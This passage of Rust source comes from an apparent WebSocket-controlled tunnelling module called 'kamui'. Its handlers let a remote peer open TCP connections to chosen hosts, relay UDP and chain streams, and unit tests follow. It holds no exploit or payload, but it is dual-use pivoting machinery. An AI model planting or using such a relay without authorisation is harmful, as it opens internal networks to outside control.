            match serde_json::from_str::<RelayIdPayload>(payload) {
                Ok(req) => {
                    manager.handle_udp_close(req.relay_id).await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_UDP_CLOSE payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_CHAIN_OPEN" => {
            match serde_json::from_str::<ChainOpenPayload>(payload) {
                Ok(req) => {
                    // Ensure WS sender is set
                    {
                        let guard = manager.ws_tx.lock().await;
                        if guard.is_none() {
                            drop(guard);
                            manager.set_ws_sender(ws_tx.clone()).await;
                            if !manager.is_enabled() {
                                manager.enable();
                            }
                        }
                    }
                    // First open the underlying TCP stream
                    manager
                        .handle_tcp_open(req.target_stream_id, &req.host, req.port)
                        .await;
                    // Then register the chain mapping
                    manager
                        .register_chain(req.chain_stream_id, req.target_stream_id)
                        .await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_CHAIN_OPEN payload: {}", e);
                }
            }
            Vec::new()
        }

        "KAMUI_CHAIN_CLOSE" => {
            match serde_json::from_str::<ChainClosePayload>(payload) {
                Ok(req) => {
                    manager.unregister_chain(req.chain_stream_id).await;
                }
                Err(e) => {
                    warn!("[kamui] Invalid KAMUI_CHAIN_CLOSE payload: {}", e);
                }
            }
            Vec::new()
        }

        other => {
            warn!("[kamui] Unknown Kamui command: {}", other);
            Vec::new()
        }
    }
}

/// Handle a raw MSG_KAMUI_TCP_DATA (0x30) binary message from the WebSocket.
///
/// Called directly from the main receive loop (not through the JSON command handler)
/// because TCP data messages use a binary format, not JSON.
///
/// Payload format: [4B stream_id BE][tcp_data]
pub async fn handle_raw_tcp_data(payload: &[u8]) {
    if payload.len() < 4 {
        debug!("[kamui] TCP_DATA payload too short ({} bytes)", payload.len());
        return;
    }

    let stream_id = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
    let data = payload[4..].to_vec();

    if data.is_empty() {
        debug!("[kamui] TCP_DATA for stream {} has empty data", stream_id);
        return;
    }

    let manager = get_manager();
    manager.handle_tcp_data(stream_id, data).await;
}

/// Parse a MSG_KAMUI_TCP_CLOSE (0x32) binary message and handle it.
pub async fn handle_raw_tcp_close(payload: &[u8]) {
    match serde_json::from_slice::<TcpClosePayload>(payload) {
        Ok(req) => {
            let manager = get_manager();
            manager.handle_tcp_close(req.stream_id).await;
        }
        Err(e) => {
            debug!("[kamui] Failed to parse TCP_CLOSE payload: {}", e);
        }
    }
}

/// Parse a MSG_KAMUI_TCP_PAUSE (0x33) binary message and handle it.
pub async fn handle_raw_tcp_pause(payload: &[u8]) {
    match serde_json::from_slice::<StreamIdPayload>(payload) {
        Ok(req) => {
            let manager = get_manager();
            manager.handle_tcp_pause(req.stream_id).await;
        }
        Err(e) => {
            debug!("[kamui] Failed to parse TCP_PAUSE payload: {}", e);
        }
    }
}

/// Parse a MSG_KAMUI_TCP_RESUME (0x34) binary message and handle it.
pub async fn handle_raw_tcp_resume(payload: &[u8]) {
    match serde_json::from_slice::<StreamIdPayload>(payload) {
        Ok(req) => {
            let manager = get_manager();
            manager.handle_tcp_resume(req.stream_id).await;
        }
        Err(e) => {
            debug!("[kamui] Failed to parse TCP_RESUME payload: {}", e);
        }
    }
}

// --- Raw binary handlers for UDP/Chain message types ---

/// Handle a raw MSG_KAMUI_UDP_BIND (0x36) binary message from the WebSocket.
///
/// Payload format: JSON {relay_id, bind_port}
pub async fn handle_raw_udp_bind(payload: &[u8]) {
    match serde_json::from_slice::<UdpBindPayload>(payload) {
        Ok(req) => {
            let manager = get_manager();
            manager.handle_udp_bind(req.relay_id, req.bind_port).await;
        }
        Err(e) => {
            debug!("[kamui] Failed to parse UDP_BIND payload: {}", e);
        }
    }
}

/// Handle a raw MSG_KAMUI_UDP_DATA (0x37) binary message from the WebSocket.
///
/// Payload format: [4B relay_id BE][2B dst_port BE][data]
pub async fn handle_raw_udp_data(payload: &[u8]) {
    if payload.len() < 6 {
        debug!("[kamui] UDP_DATA payload too short ({} bytes)", payload.len());
        return;
    }

    let relay_id = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
    let dst_port = u16::from_be_bytes([payload[4], payload[5]]);
    let data = payload[6..].to_vec();

    if data.is_empty() {
        debug!("[kamui] UDP_DATA for relay {} has empty data", relay_id);
        return;
    }

    let manager = get_manager();
    manager.handle_udp_data(relay_id, dst_port, data).await;
}

/// Handle a raw MSG_KAMUI_UDP_CLOSE (0x38) binary message from the WebSocket.
///
/// Payload format: JSON {relay_id}
pub async fn handle_raw_udp_close(payload: &[u8]) {
    match serde_json::from_slice::<RelayIdPayload>(payload) {
        Ok(req) => {
            let manager = get_manager();
            manager.handle_udp_close(req.relay_id).await;
        }
        Err(e) => {
            debug!("[kamui] Failed to parse UDP_CLOSE payload: {}", e);
        }
    }
}

/// Handle a raw MSG_KAMUI_CHAIN_DATA (0x39) binary message from the WebSocket.
///
/// Payload format: [4B chain_stream_id BE][data]
pub async fn handle_raw_chain_data(payload: &[u8]) {
    if payload.len() < 4 {
        debug!("[kamui] CHAIN_DATA payload too short ({} bytes)", payload.len());
        return;
    }

    let chain_stream_id = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
    let data = payload[4..].to_vec();

    if data.is_empty() {
        debug!("[kamui] CHAIN_DATA for chain {} has empty data", chain_stream_id);
        return;
    }

    let manager = get_manager();
    manager.handle_chain_data(chain_stream_id, data).await;
}

/// Shut down Kamui entirely. Called during client cleanup / disconnect.
pub async fn shutdown() {
    let manager = get_manager();
    manager.close_all().await;
    manager.clear_ws_sender().await;
    manager
        .enabled
        .store(false, std::sync::atomic::Ordering::SeqCst);
    info!("[kamui] Shutdown complete");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_tcp_data() {
        let msg = build_tcp_data(1, b"hello");
        // [0x30][4B len BE][4B stream_id BE][data]
        assert_eq!(msg[0], MSG_KAMUI_TCP_DATA);
        let len = u32::from_be_bytes([msg[1], msg[2], msg[3], msg[4]]) as usize;
        assert_eq!(len, 4 + 5); // 4 bytes stream_id + 5 bytes data
        let stream_id = u32::from_be_bytes([msg[5], msg[6], msg[7], msg[8]]);
        assert_eq!(stream_id, 1);
        assert_eq!(&msg[9..], b"hello");
    }

    #[test]
    fn test_build_tcp_close() {
        let msg = build_tcp_close(42, Some("timeout"));
        assert_eq!(msg[0], MSG_KAMUI_TCP_CLOSE);
        let len = u32::from_be_bytes([msg[1], msg[2], msg[3], msg[4]]) as usize;
        let payload_str = std::str::from_utf8(&msg[5..5 + len]).unwrap();
        let v: serde_json::Value = serde_json::from_str(payload_str).unwrap();
        assert_eq!(v["stream_id"], 42);
        assert_eq!(v["reason"], "timeout");
    }

    #[test]
    fn test_build_tcp_error() {
        let msg = build_tcp_error(7, "connection refused");
        assert_eq!(msg[0], MSG_KAMUI_TCP_ERROR);
        let len = u32::from_be_bytes([msg[1], msg[2], msg[3], msg[4]]) as usize;
        let payload_str = std::str::from_utf8(&msg[5..5 + len]).unwrap();
        let v: serde_json::Value = serde_json::from_str(payload_str).unwrap();
        assert_eq!(v["stream_id"], 7);
        assert_eq!(v["error"], "connection refused");
    }

    #[test]
    fn test_build_message_format() {
        let msg = build_message(0x30, b"test");
        assert_eq!(msg.len(), 5 + 4);
        assert_eq!(msg[0], 0x30);
        let len = u32::from_be_bytes([msg[1], msg[2], msg[3], msg[4]]);
        assert_eq!(len, 4);
        assert_eq!(&msg[5..], b"test");
    }

    #[tokio::test]
    async fn test_manager_lifecycle() {
        let mgr = KamuiManager::new();
        assert!(!mgr.is_enabled());
        assert_eq!(mgr.active_stream_count().await, 0);

        mgr.enable();
        assert!(mgr.is_enabled());

        mgr.disable().await;
        assert!(!mgr.is_enabled());
    }

    #[tokio::test]
    async fn test_close_unknown_stream() {
        let mgr = KamuiManager::new();
        // Should not panic
        mgr.handle_tcp_close(999).await;
    }

    #[tokio::test]
    async fn test_pause_resume_unknown_stream() {
        let mgr = KamuiManager::new();
        // Should not panic
        mgr.handle_tcp_pause(999).await;
        mgr.handle_tcp_resume(999).await;
    }

    #[tokio::test]
    async fn test_handle_raw_tcp_data_short_payload() {
        // Should not panic with very short payload
        handle_raw_tcp_data(&[0, 1]).await;
    }

    #[tokio::test]
    async fn test_handle_raw_tcp_data_empty_data() {
        // stream_id only, no actual data — should be a no-op
        handle_raw_tcp_data(&[0, 0, 0, 1]).await;
    }

    #[tokio::test]
    async fn test_stream_stats_empty() {
        let mgr = KamuiManager::new();
        let stats = mgr.stream_stats().await;
        assert!(stats.is_empty());
    }
}

```